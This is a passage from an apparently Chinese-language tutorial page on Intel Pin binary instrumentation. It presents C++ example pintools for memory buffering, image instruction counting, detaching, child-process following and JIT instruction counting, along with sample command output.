class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/*</span></div><div class=\"line\"> * Note that opening a file in a callback is only supported on Linux systems.</div><div class=\"line\"> * See buffer-win.cpp for how to work around this issue on Windows.</div><div class=\"line\"> */</div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">ThreadStart</span><span class=\"params\">(THREADID tid, CONTEXT *ctxt, INT32 flags, VOID *v)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"comment\">// There is a new MLOG for every thread.  Opens the output file.</span></div><div class=\"line\">    MLOG * mlog = <span class=\"keyword\">new</span> MLOG(tid);</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// A thread will need to look up its MLOG, so save pointer in TLS</span></div><div class=\"line\">    PIN_SetThreadData(mlog_key, mlog, tid);</div><div class=\"line\"></div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">ThreadFini</span><span class=\"params\">(THREADID tid, <span class=\"keyword\">const</span> CONTEXT *ctxt, INT32 code, VOID *v)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    MLOG * mlog = <span class=\"keyword\">static_cast</span>&lt;MLOG*&gt;(PIN_GetThreadData(mlog_key, tid));</div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">delete</span> mlog;</div><div class=\"line\"></div><div class=\"line\">    PIN_SetThreadData(mlog_key, <span class=\"number\">0</span>, tid);</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* Print Help Message                                                    */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\">INT32 <span class=\"title\">Usage</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"built_in\">cerr</span> &lt;&lt; <span class=\"string\">\"This tool demonstrates the basic use of the buffering API.\"</span> &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">    <span class=\"built_in\">cerr</span> &lt;&lt; <span class=\"built_in\">endl</span> &lt;&lt; KNOB_BASE::StringKnobSummary() &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* Main                                                                  */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> *argv[])</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"comment\">// Initialize PIN library. Print help message if -h(elp) is specified</span></div><div class=\"line\">    <span class=\"comment\">// in the command line or the command line is invalid</span></div><div class=\"line\">    <span class=\"keyword\">if</span>( PIN_Init(argc,argv) )</div><div class=\"line\">    &#123;</div><div class=\"line\">        <span class=\"keyword\">return</span> Usage();</div><div class=\"line\">    &#125;</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"comment\">// Initialize the memory reference buffer;</span></div><div class=\"line\">    <span class=\"comment\">// set up the callback to process the buffer.</span></div><div class=\"line\">    <span class=\"comment\">//</span></div><div class=\"line\">    bufId = PIN_DefineTraceBuffer(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">struct</span> MEMREF), NUM_BUF_PAGES,</div><div class=\"line\">                                  BufferFull, <span class=\"number\">0</span>);</div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">if</span>(bufId == BUFFER_ID_INVALID)</div><div class=\"line\">    &#123;</div><div class=\"line\">        <span class=\"built_in\">cerr</span> &lt;&lt; <span class=\"string\">\"Error: could not allocate initial buffer\"</span> &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</div><div class=\"line\">    &#125;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Initialize thread-specific data not handled by buffering api.</span></div><div class=\"line\">    mlog_key = PIN_CreateThreadDataKey(<span class=\"number\">0</span>);</div><div class=\"line\">   </div><div class=\"line\">    <span class=\"comment\">// add an instrumentation function</span></div><div class=\"line\">    TRACE_AddInstrumentFunction(Trace, <span class=\"number\">0</span>);</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// add callbacks</span></div><div class=\"line\">    PIN_AddThreadStartFunction(ThreadStart, <span class=\"number\">0</span>);</div><div class=\"line\">    PIN_AddThreadFiniFunction(ThreadFini, <span class=\"number\">0</span>);</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Start the program, never returns</span></div><div class=\"line\">    PIN_StartProgram();</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<h1 id=\"Finding-the-Static-Properties-of-an-Image-查看镜像的静态属性\"><a href=\"#Finding-the-Static-Properties-of-an-Image-查看镜像的静态属性\" class=\"headerlink\" title=\"Finding the Static Properties of an Image 查看镜像的静态属性\"></a>Finding the Static Properties of an Image 查看镜像的静态属性</h1><p>在不插装的情况下，可以使用Pin检查二进制文件，用于帮助程序员查看镜像的静态属性。<br>下例展示了，未插装时，镜像中的指令数。<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\">//</span></div><div class=\"line\"><span class=\"comment\">// This tool prints a trace of image load and unload events</span></div><div class=\"line\"><span class=\"comment\">//</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"pin.H\"</span></span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// Pin calls this function every time a new img is loaded</span></div><div class=\"line\"><span class=\"comment\">// It can instrument the image, but this example merely</span></div><div class=\"line\"><span class=\"comment\">// counts the number of static instructions in the image</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">ImageLoad</span><span class=\"params\">(IMG img, VOID *v)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    UINT32 count = <span class=\"number\">0</span>;</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"keyword\">for</span> (SEC sec = IMG_SecHead(img); SEC_Valid(sec); sec = SEC_Next(sec))</div><div class=\"line\">    &#123; </div><div class=\"line\">        <span class=\"keyword\">for</span> (RTN rtn = SEC_RtnHead(sec); RTN_Valid(rtn); rtn = RTN_Next(rtn))</div><div class=\"line\">        &#123;</div><div class=\"line\">            <span class=\"comment\">// Prepare for processing of RTN, an  RTN is not broken up into BBLs,</span></div><div class=\"line\">            <span class=\"comment\">// it is merely a sequence of INSs </span></div><div class=\"line\">            RTN_Open(rtn);</div><div class=\"line\">            </div><div class=\"line\">            <span class=\"keyword\">for</span> (INS ins = RTN_InsHead(rtn); INS_Valid(ins); ins = INS_Next(ins))</div><div class=\"line\">            &#123;</div><div class=\"line\">                count++;</div><div class=\"line\">            &#125;</div><div class=\"line\"></div><div class=\"line\">            <span class=\"comment\">// to preserve space, release data associated with RTN after we have processed it</span></div><div class=\"line\">            RTN_Close(rtn);</div><div class=\"line\">        &#125;</div><div class=\"line\">    &#125;</div><div class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stderr</span>, <span class=\"string\">\"Image %s has  %d instructions\\n\"</span>, IMG_Name(img).c_str(), count);</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* Print Help Message                                                    */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\">INT32 <span class=\"title\">Usage</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"built_in\">cerr</span> &lt;&lt; <span class=\"string\">\"This tool prints a log of image load and unload events\"</span> &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">    <span class=\"built_in\">cerr</span> &lt;&lt; <span class=\"string\">\" along with static instruction counts for each image.\"</span> &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">    <span class=\"built_in\">cerr</span> &lt;&lt; <span class=\"built_in\">endl</span> &lt;&lt; KNOB_BASE::StringKnobSummary() &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* Main                                                                  */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> * argv[])</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"comment\">// prepare for image instrumentation mode</span></div><div class=\"line\">    PIN_InitSymbols();</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Initialize pin</span></div><div class=\"line\">    <span class=\"keyword\">if</span> (PIN_Init(argc, argv)) <span class=\"keyword\">return</span> Usage();</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Register ImageLoad to be called when an image is loaded</span></div><div class=\"line\">    IMG_AddInstrumentFunction(ImageLoad, <span class=\"number\">0</span>);</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Start the program, never returns</span></div><div class=\"line\">    PIN_StartProgram();</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<h1 id=\"Detaching-Pin-from-the-Application\"><a href=\"#Detaching-Pin-from-the-Application\" class=\"headerlink\" title=\"Detaching Pin from the Application\"></a>Detaching Pin from the Application</h1><p>调用PIN_Detach放弃Pin对程序的控制权，程序以原有速度执行未插装的原始代码。</p>\n<p>源码参见 source/tools/ManualExamples/detach.cpp<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"pin.H\"</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">// This tool shows how to detach Pin from an </span></div><div class=\"line\"><span class=\"comment\">// application that is under Pin's control.</span></div><div class=\"line\"></div><div class=\"line\">UINT64 icount = <span class=\"number\">0</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> N 10000</span></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">docount</span><span class=\"params\">()</span> </span></div><div class=\"line\">&#123;</div><div class=\"line\">    icount++;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Release control of application if 10000 </span></div><div class=\"line\">    <span class=\"comment\">// instructions have been executed</span></div><div class=\"line\">    <span class=\"keyword\">if</span> ((icount % N) == <span class=\"number\">0</span>) </div><div class=\"line\">    &#123;</div><div class=\"line\">        PIN_Detach();</div><div class=\"line\">    &#125;</div><div class=\"line\">&#125;</div><div class=\"line\"> </div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">Instruction</span><span class=\"params\">(INS ins, VOID *v)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    INS_InsertCall(ins, IPOINT_BEFORE, (AFUNPTR)docount, IARG_END);</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\">VOID <span class=\"title\">ByeWorld</span><span class=\"params\">(VOID *v)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"built_in\">std</span>::<span class=\"built_in\">cerr</span> &lt;&lt; <span class=\"built_in\">endl</span> &lt;&lt; <span class=\"string\">\"Detached at icount = \"</span> &lt;&lt; N &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* Print Help Message                                                    */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\">INT32 <span class=\"title\">Usage</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"built_in\">cerr</span> &lt;&lt; <span class=\"string\">\"This tool demonstrates how to detach Pin from an \"</span> &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">    <span class=\"built_in\">cerr</span> &lt;&lt; <span class=\"string\">\"application that is under Pin's control\"</span> &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">    <span class=\"built_in\">cerr</span> &lt;&lt; <span class=\"built_in\">endl</span> &lt;&lt; KNOB_BASE::StringKnobSummary() &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* Main                                                                  */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">int</span> argc, <span class=\"keyword\">char</span> * argv[])</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"keyword\">if</span> (PIN_Init(argc, argv)) <span class=\"keyword\">return</span> Usage();</div><div class=\"line\"></div><div class=\"line\">    <span class=\"comment\">// Callback function to invoke for every </span></div><div class=\"line\">    <span class=\"comment\">// execution of an instruction</span></div><div class=\"line\">    INS_AddInstrumentFunction(Instruction, <span class=\"number\">0</span>);</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"comment\">// Callback functions to invoke before</span></div><div class=\"line\">    <span class=\"comment\">// Pin releases control of the application</span></div><div class=\"line\">    PIN_AddDetachFunction(ByeWorld, <span class=\"number\">0</span>);</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"comment\">// Never returns</span></div><div class=\"line\">    PIN_StartProgram();</div><div class=\"line\">    </div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<h1 id=\"Instrumenting-Child-Processes\"><a href=\"#Instrumenting-Child-Processes\" class=\"headerlink\" title=\"Instrumenting Child Processes\"></a>Instrumenting Child Processes</h1><p>PIN_AddFollowChildProcessFunction()允许程序员在execv进程开始前定义想要执行的函数。<br>在命令行中使用  -follow_execv 选项插装子进程，如下：<br><figure class=\"highlight awk\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ ..<span class=\"regexp\">/../</span>..<span class=\"regexp\">/pin -follow_execv -t obj-intel64/</span>follow_child_tool.so -- obj-intel64<span class=\"regexp\">/follow_child_app1 obj-intel64/</span>follow_child_app2</div></pre></td></tr></table></figure></p>\n<p>源码参见 source/tools/ManualExamples/follow_child_tool.cpp ，使用下列命令build test文件：<br><figure class=\"highlight elixir\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"variable\">$ </span>make follow_child_tool.test</div></pre></td></tr></table></figure></p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">\"pin.H\"</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;unistd.h&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"><span class=\"comment\">/* Command line Switches */</span></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\">BOOL <span class=\"title\">FollowChild</span><span class=\"params\">(CHILD_PROCESS childProcess, VOID * userData)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"built_in\">fprintf</span>(<span class=\"built_in\">stdout</span>, <span class=\"string\">\"before child:%u\\n\"</span>, getpid());</div><div class=\"line\">    <span class=\"keyword\">return</span> TRUE;</div><div class=\"line\">&#125;        </div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/* ===================================================================== */</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(INT32 argc, CHAR **argv)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">    PIN_Init(argc, argv);</div><div class=\"line\"></div><div class=\"line\">    PIN_AddFollowChildProcessFunction(FollowChild, <span class=\"number\">0</span>);</div><div class=\"line\"></div><div class=\"line\">    PIN_StartProgram();</div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<h1 id=\"Managed-platforms-support\"><a href=\"#Managed-platforms-support\" class=\"headerlink\" title=\"Managed platforms support\"></a>Managed platforms support</h1><p>Pintools中的 RTN_IsDynamic() 校验动态生成的代码。<br>下例展示了 RTN_IsDynamic() 的用法，通过插装程序，计算发现并执行的指令总数，指令分为三类：原生指令，动态指令和 instructions without any known routine。</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div></pre></td><td class=\"code\"><pre><div class=\"line\">$ <span class=\"keyword\">set</span> CL_CONFIG_USE_VTUNE=<span class=\"literal\">True</span></div><div class=\"line\">$ <span class=\"keyword\">set</span> INTEL_JIT_PROFILER32=ia32\\<span class=\"keyword\">bin</span>\\pinjitprofiling.dll</div><div class=\"line\">$ ia32\\<span class=\"keyword\">bin</span>\\pin.exe -t <span class=\"keyword\">source</span>\\tools\\JitProfilingApiTests\\obj-ia32\\DynamicInsCount.dll -support_jit_api -o DynamicInsCount.out <span class=\"comment\">-- ..\\OpenCL\\Win32\\Debug\\BitonicSort.exe</span></div><div class=\"line\"><span class=\"keyword\">No</span> command line arguments specified, <span class=\"keyword\">using</span> <span class=\"keyword\">default</span> values.</div><div class=\"line\">Initializing OpenCL runtime...</div><div class=\"line\">Trying <span class=\"keyword\">to</span> run <span class=\"keyword\">on</span> a CPU</div><div class=\"line\">OpenCL <span class=\"keyword\">data</span> alignment <span class=\"keyword\">is</span> <span class=\"number\">128</span> bytes.</div><div class=\"line\">Reading <span class=\"keyword\">file</span> <span class=\"string\">'BitonicSort.cl'</span> (<span class=\"keyword\">size</span> <span class=\"number\">3435</span> <span class=\"keyword\">bytes</span>)</div><div class=\"line\"><span class=\"keyword\">Sort</span> <span class=\"keyword\">order</span> <span class=\"keyword\">is</span> ascending</div><div class=\"line\"><span class=\"keyword\">Input</span> <span class=\"keyword\">size</span> <span class=\"keyword\">is</span> <span class=\"number\">1048576</span> items</div><div class=\"line\">Executing OpenCL kernel...</div><div class=\"line\">Executing reference...</div><div class=\"line\">Performing verification...</div><div class=\"line\">Verification succeeded.</div><div class=\"line\">NDRange perf. counter <span class=\"keyword\">time</span> <span class=\"number\">12994.272962</span> ms.</div><div class=\"line\">Releasing resources...</div><div class=\"line\">$ <span class=\"keyword\">type</span> JitInsCount.out</div><div class=\"line\">===============================================</div><div class=\"line\"><span class=\"built_in\">Number</span> <span class=\"keyword\">of</span> executed <span class=\"keyword\">native</span> instructions: <span class=\"number\">7631596649</span></div><div class=\"line\"><span class=\"built_in\">Number</span> <span class=\"keyword\">of</span> executed jitted instructions: <span class=\"number\">438983207</span></div><div class=\"line\"><span class=\"built_in\">Number</span> <span class=\"keyword\">of</span> executed instructions <span class=\"keyword\">without</span> <span class=\"keyword\">any</span> known routine: <span class=\"number\">12246</span></div><div class=\"line\">===============================================</div><div class=\"line\"><span class=\"built_in\">Number</span> <span class=\"keyword\">of</span> discovered <span class=\"keyword\">native</span> instructions: <span class=\"number\">870531</span></div><div class=\"line\"><span class=\"built_in\">Number</span> <span class=\"keyword\">of</span> discovered jitted instructions: <span class=\"number\">223</span></div><div class=\"line\"><span class=\"built_in\">Number</span> <span class=\"keyword\">of</span> discovered instructions <span class=\"keyword\">without</span> <span class=\"keyword\">any</span> known routine: <span class=\"number\">36</span></div><div class=\"line\">===============================================</div></pre></td></tr></table></figure>\n<p>源码参见  source.cpp<br><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div><div class=\"line\">65</div><div class=\"line\">66</div><div class=\"line\">67</div><div class=\"line\">68</div><div class=\"line\">69</div><div class=\"line\">70</div><div class=\"line\">71</div><div class=\"line\">72</div><div class=\"line\">73</div><div class=\"line\">74</div><div class=\"line\">75</div><div class=\"line\">76</div><div class=\"line\">77</div><div class=\"line\">78</div><div class=\"line\">79</div><div class=\"line\">80</div><div class=\"line\">81</div><div class=\"line\">82</div><div class=\"line\">83</div><div class=\"line\">84</div><div class=\"line\">85</div><div class=\"line\">86</div><div class=\"line\">87</div><div class=\"line\">88</div><div class=\"line\">89</div><div class=\"line\">90</div><div class=\"line\">91</div><div class=\"line\">92</div><div class=\"line\">93</div><div class=\"line\">94</div><div class=\"line\">95</div><div class=\"line\">96</div><div class=\"line\">97</div><div class=\"line\">98</div><div class=\"line\">99</div><div class=\"line\">100</div><div class=\"line\">101</div><div class=\"line\">102</div><div class=\"line\">103</div><div class=\"line\">104</div><div class=\"line\">105</div><div class=\"line\">106</div><div class=\"line\">107</div><div class=\"line\">108</div><div class=\"line\">109</div><div class=\"line\">110</div><div class=\"line\">111</div><div class=\"line\">112</div><div class=\"line\">113</div><div class=\"line\">114</div><div class=\"line\">115</div><div class=\"line\">116</div><div class=\"line\">117</div><div class=\"line\">118</div><div class=\"line\">119</div><div class=\"line\">120</div><div class=\"line\">121</div><div class=\"line\">122</div><div class=\"line\">123</div><div class=\"line\">124</div><div class=\"line\">125</div><div class=\"line\">126</div><div class=\"line\">127</div><div class=\"line\">128</div><div class=\"line\">129</div><div class=\"line\">130</div><div class=\"line\">131</div><div class=\"line\">132</div><div class=\"line\">133</div><div class=\"line\">134</div><div class=\"line\">135</div><div class=\"line\">136</div><div class=\"line\">137</div><div class=\"line\">138</div><div class=\"line\">139</div><div class=\"line\">140</div><div class=\"line\">141</div><div class=\"line\">142</div></pre></td><td 